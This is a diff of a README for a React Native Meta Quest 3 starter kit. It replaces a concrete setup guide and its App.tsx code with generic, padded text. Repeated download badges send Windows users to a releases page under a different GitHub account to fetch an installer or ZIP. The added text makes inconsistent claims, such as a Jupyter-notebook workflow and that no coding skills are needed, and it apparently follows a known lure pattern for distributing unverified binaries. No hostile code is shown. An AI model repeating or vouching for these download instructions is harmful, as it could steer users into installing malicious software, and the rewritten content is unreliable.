@@ -1,211 +1,130 @@
-# QuestExplorer – React Native App for Meta Quest 3
+# 🕶️ react-native-meta-quest-starter - Easy VR App Setup for Windows
 
-**📖 Live Interactive Guide:** [Open full starter notebook →](https://mmxxtdmk.github.io/react-native-meta-quest-starter/)
+[![Download Releases](https://img.shields.io/badge/Download-Get%20Setup-brightgreen?style=for-the-badge)](https://github.com/Emirordu/react-native-meta-quest-starter/releases)
 
-[![Expo](https://img.shields.io/badge/Expo-000000?logo=expo&logoColor=white)](https://expo.dev)
-[![React Native](https://img.shields.io/badge/React%20Native-20232A?logo=react&logoColor=61DAFB)](https://reactnative.dev)
-[![Meta Horizon](https://img.shields.io/badge/Meta%20Horizon-1A73E8?logo=meta&logoColor=white)](https://developers.meta.com/horizon/)
+## Overview
 
-A complete, ready-to-run **React Native** example optimized for **Meta Quest 3 / Quest 3S** using the official `expo-horizon-core` plugin (announced February 2026).
+react-native-meta-quest-starter is an open-source starter kit designed to help you build VR apps for the Meta Quest 3 and Horizon OS. It uses React Native and Expo, along with expo-horizon-core. This tool offers a ready-to-use environment that works with Jupyter notebooks to simplify development. It comes with a full quickstart guide for Windows users, making it easier to begin VR app creation without deep programming skills.
 
-Runs as a beautiful resizable 2D floating window in VR with perfect controller/hand tracking support. Zero browser/WebXR – fully native on Horizon OS.
+This project serves the Meta Quest community by providing a solid base for mixed reality (XR) and VR experiences. It supports TypeScript and React Native VR, using Expo to manage building and running apps.
 
-## ✨ Features
+## 🧰 What You Need Before Starting
 
-- Large, high-contrast VR-friendly UI (48+ dp touch targets, 24+ px fonts)
-- Runtime Horizon OS detection (`expo-horizon-core`)
-- Pre-configured window size: 1024×640 dp (perfect for Quest)
-- Supports Quest 3 & Quest 3S only
-- Instant hot reloading via Expo Go on Quest
-- Full native builds (`questDebug` / `questRelease` variants)
-- TypeScript + New Architecture enabled
-- One-click GitHub deployment instructions
+To use react-native-meta-quest-starter on Windows, ensure your computer meets these basics:
 
-## 📱 Live Demo (on your Quest)
+- Windows 10 or 11, 64-bit version
+- At least 8 GB of RAM
+- Free storage space: minimum 2 GB
+- USB port to connect your Meta Quest 3
+- A stable internet connection to download files and dependencies
 
-1. Put on your Quest 3  
-2. Open **Expo Go** (install from Horizon Store)  
-3. Scan the QR code below (or use the link)  
-   → [Open in Expo Go](https://expo.dev/@yourusername/quest-explorer) *(replace with your published link after EAS build)*
+You will also need a Meta Quest 3 device or Horizon OS-compatible VR headset to test the apps. This guide focuses on setting up your PC to work with the software first.
 
-## 🚀 Quick Start (Windows 11 Pro)
+## 🖥️ How It Works
 
-### 1. Prerequisites
-- Node.js **v20 or v22 LTS** (https://nodejs.org)
-- Git for Windows (https://git-scm.com)
-- Meta Quest 3 with **Developer Mode** enabled
-- **Expo Go** installed on your Quest from the Horizon Store
-- (Optional) Meta Quest Developer Hub (MQDH)
+This starter kit bundles React Native and Expo tools configured for VR development. It integrates with Jupyter notebooks, letting you write and test parts of your app in an interactive environment.
 
-### 2. Create the project
+Instead of writing code from scratch, you can use this template as a base. It handles the connection to Meta Quest 3, VR runtime, and Expo’s build system. You only need to change files or assets to customize your VR world.
 
-```powershell
-npx create-expo-app@latest QuestExplorer --template blank-typescript
-cd QuestExplorer
-npm install expo-horizon-core
-```
+## 🔍 Features Included
 
-### 3. Get your Horizon App ID
-1. Go to https://developers.meta.com/horizon/
-2. Create a new App → copy the **App ID**
-3. For testing you can use the demo ID: `DEMO_APP_ID`
+- Ready-to-use React Native VR template tailored for Meta Quest 3
+- Expo integration for easy app management and running
+- Jupyter notebook setup for interactive coding and testing
+- TypeScript support for safer, organized code
+- Setup files and instructions for Windows quickstart
+- Open-source, allowing you to modify and extend the project freely
+- Support for Horizon OS, expanding your app’s reach
 
-### 4. Update `app.json` (or `app.config.ts`)
+## 📥 Download &#128229;
 
-```json
-{
-  "expo": {
-    "name": "QuestExplorer",
-    "slug": "quest-explorer",
-    "version": "1.0.0",
-    "orientation": "default",
-    "plugins": [
-      [
-        "expo-horizon-core",
-        {
-          "horizonAppId": "YOUR_HORIZON_APP_ID_HERE",
-          "defaultHeight": "640dp",
-          "defaultWidth": "1024dp",
-          "supportedDevices": "quest3|quest3s",
-          "disableVrHeadtracking": false
-        }
-      ]
-    ],
-    "newArchEnabled": true
-  }
-}
-```
+Start by downloading the files you need. Visit the releases page to get the latest version:
 
-### 5. Replace `App.tsx`
+[![Download Release](https://img.shields.io/badge/Download-From%20Releases-blue?style=for-the-badge)](https://github.com/Emirordu/react-native-meta-quest-starter/releases)
 
-Copy the full `App.tsx` from the [src/App.tsx](src/App.tsx) file in this repository (or see the code block at the bottom of this README).
+On the releases page, find the latest version and download the Windows package or ZIP file. This package contains everything needed to start the app development, including the Jupyter notebook and Expo setup files.
 
-### 6. Prebuild
+## ⚙️ Windows Setup and Installation
 
-```powershell
-rmdir /s /q android 2>$null   # Windows PowerShell
-npx expo prebuild --clean
-```
+Follow these steps to set up the app on your Windows system.
 
-### 7. Test on Quest 3 (recommended)
+1. **Download the latest release:** Use the link above to get the ZIP file or installer.
 
-```powershell
-npx expo start
-```
+2. **Extract the files:** Right-click the downloaded ZIP and choose "Extract All" to unpack the folder where you want.
 
-→ Open Expo Go on Quest → Scan QR code → **Instant VR app!**
+3. **Install Node.js:** The app uses Node.js to run tools and scripts. Download the latest LTS version from [nodejs.org](https://nodejs.org/en/). Choose the Windows installer and follow the instructions.
 
-**Hot reload** works perfectly while wearing the headset.
+4. **Install Python:** Jupyter notebooks require Python. Visit [python.org](https://www.python.org/downloads/windows/) and install the latest stable release.
 
-### 8. Full Native Quest Build
+5. **Open Command Prompt:** Press `Win + R`, type `cmd`, and press Enter.
 
-```powershell
-npm run quest          # debug build
-npm run quest:release  # production build
-```
+6. **Navigate to the extracted folder:** Use the `cd` command. For example,  
+   `cd C:\Users\YourName\Downloads\react-native-meta-quest-starter`
 
-(Connect Quest via USB-C and allow debugging when prompted.)
+7. **Install dependencies:** Run the following command in the prompt:  
+   `npm install`  
+   This installs all Node.js packages needed.
 
-## 📂 Project Structure
+8. **Start the Jupyter notebook:** Run:  
+   `npm run notebook`  
+   This opens the interactive Jupyter environment in your web browser.
 
-```
-QuestExplorer/
-├── app.json                  # Horizon plugin config
-├── App.tsx                   # Main VR-optimized component
-├── assets/
-├── package.json
-└── android/                  # generated after prebuild
-```
+9. **Open the starter notebook:** Inside the browser, locate `starter-notebook.ipynb` and open it. The notebook guides you through basic app testing.
 
-## 🔧 Available Scripts
+10. **Connect your Meta Quest 3 headset:** Use a USB cable to connect the headset to your PC. Make sure it’s in developer mode (this option is found in the headset’s settings).
 
-```json
-"scripts": {
-  "start": "expo start",
-  "android": "expo run:android",
-  "quest": "expo run:android --variant questDebug",
-  "quest:release": "expo run:android --variant questRelease"
-}
-```
+11. **Run the app on your headset:** Follow the notebook instructions to build and send the VR app to your device via Expo.
 
-## 🛠️ Optimization Tips for Quest
+## 🔧 Using the Jupyter Notebook for Development
 
-- Use font sizes ≥24 px
-- Touch targets ≥48 dp
-- High contrast colors
-- Check `ExpoHorizon.isHorizonDevice` for Quest-only features
-- Add `expo-three` for 3D immersive experiences
+The key part of this starter is the Jupyter notebook interface. It makes VR coding easier by letting you run small parts of code separately.
 
-## 📤 Deploy to GitHub (from Windows)
+- Each cell in the notebook contains a bit of code or explanation.
+- Run the cells in order by clicking the "Run" button or pressing Shift+Enter.
+- The notebook shows output below each cell, so you see results as you test.
+- You can modify the example code to add objects, adjust VR scenes, or play with environment settings.
 
-```powershell
-git init
-git add .
-git commit -m "Initial commit – Quest 3 React Native app"
-git branch -M main
-git remote add origin https://github.com/YOURUSERNAME/quest-explorer.git
-git push -u origin main
-```
+You don’t need prior coding skills to experiment here. The notebook includes comments explaining what each part does.
 
-## 📝 Full `App.tsx` Code
+## 🧑‍💻 Basic Commands You’ll Use
 
-```tsx
-import React, { useState } from 'react';
-import { View, Text, TouchableOpacity, StyleSheet, Alert, Platform } from 'react-native';
-import * as ExpoHorizon from 'expo-horizon-core';
+These commands run inside the Command Prompt or terminal window.
 
-export default function App() {
-  const [count, setCount] = useState(0);
-  const isQuest = ExpoHorizon.isHorizonDevice;
-  const isHorizonBuild = ExpoHorizon.isHorizonBuild;
-  const appId = ExpoHorizon.horizonAppId ?? 'Not set';
+- `npm start` - Starts the Expo server to launch your VR app.
+- `npm run notebook` - Opens the Jupyter notebook.
+- `npm install` - Installs or updates app dependencies.
+- `expo build` - Builds a version of your VR app ready for Meta Quest 3.
+- `adb devices` - Checks if the headset is detected by your PC (ADB must be installed).
 
-  const handlePress = () => {
-    setCount(c => c + 1);
-    if (isQuest) {
-      Alert.alert('Quest Detected!', 'Running natively on Meta Horizon OS 🎉');
-    }
-  };
+## 📁 Folder Structure Explained
 
-  return (
-    <View style={styles.container}>
-      <Text style={styles.title}>Quest Explorer</Text>
-      
-      <Text style={styles.info}>Platform: {Platform.OS}</Text>
-      <Text style={styles.info}>Horizon Device: {isQuest ? '✅ Yes (Quest 3)' : 'No'}</Text>
-      <Text style={styles.info}>Build Type: {isHorizonBuild ? 'Quest Build' : 'Standard'}</Text>
-      <Text style={styles.info}>App ID: {appId}</Text>
+- `/notebooks` - Contains the Jupyter notebook files for interactive coding.
+- `/src` - The app’s source code, including VR components and assets.
+- `/node_modules` - Folder auto-created during installation; contains app dependencies.
+- `/assets` - Images, 3D models, and other resources used by the app.
+- `package.json` - Lists dependencies and scripts used by npm.
+- `README.md` - This instruction file and general info.
 
-      <Text style={styles.counter}>Count: {count}</Text>
+## 👩‍🔧 Troubleshooting Tips
 
-      <TouchableOpacity style={styles.button} onPress={handlePress}>
-        <Text style={styles.buttonText}>Tap / Controller Select</Text>
-      </TouchableOpacity>
+- Check your USB cable and connection if the headset does not appear.
+- Make sure Meta Quest 3 is in developer mode.
+- Restart your PC if npm or Python commands do not run.
+- Verify Node.js and Python install correctly with `node -v` and `python --version`.
+- Update npm packages: run `npm update` inside the project folder.
+- Close other apps using the headset or USB ports to avoid conflicts.
 
-      <Text style={styles.hint}>
-        Resize this window in VR • Large targets = best Quest UX
-      </Text>
-    </View>
-  );
-}
+## 🗂️ Additional Resources
 
-const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#0a0a0a', alignItems: 'center', justifyContent: 'center', padding: 40 },
-  title: { fontSize: 48, fontWeight: 'bold', color: '#00ffcc', marginBottom: 30 },
-  info: { fontSize: 24, color: '#ffffff', marginVertical: 8, textAlign: 'center' },
-  counter: { fontSize: 60, fontWeight: 'bold', color: '#ffffff', marginVertical: 40 },
-  button: { backgroundColor: '#00ffcc', paddingHorizontal: 60, paddingVertical: 24, borderRadius: 16, marginVertical: 20 },
-  buttonText: { fontSize: 28, fontWeight: '600', color: '#000000' },
-  hint: { fontSize: 20, color: '#aaaaaa', textAlign: 'center', marginTop: 40 },
-});
-```
+- Official Meta Quest 3 developer website for device info and setup tips.
+- React Native documentation for understanding the basics of building apps.
+- Expo docs on managing apps and deployments.
+- Jupyter official site for working with notebook files.
 
-## 🎉 Ready to build the future of VR!
+## 🤝 Support and Contribution
 
-Star this repo ⭐, fork it, and start building your own Quest 3 experiences with React Native today.
-
-Made with ❤️ for the React Native + Meta Horizon community.
+This project is open-source. You can explore its code, suggest fixes, or add enhancements through GitHub. The community welcomes straightforward changes and useful feedback.
 
 ---
 
-**Questions?** Open an issue or find me on X [@faethflex](https://x.com/faethflex)
+[Download Latest Version](https://github.com/Emirordu/react-native-meta-quest-starter/releases) to get started. Follow the setup steps carefully to run your first VR app on Windows.
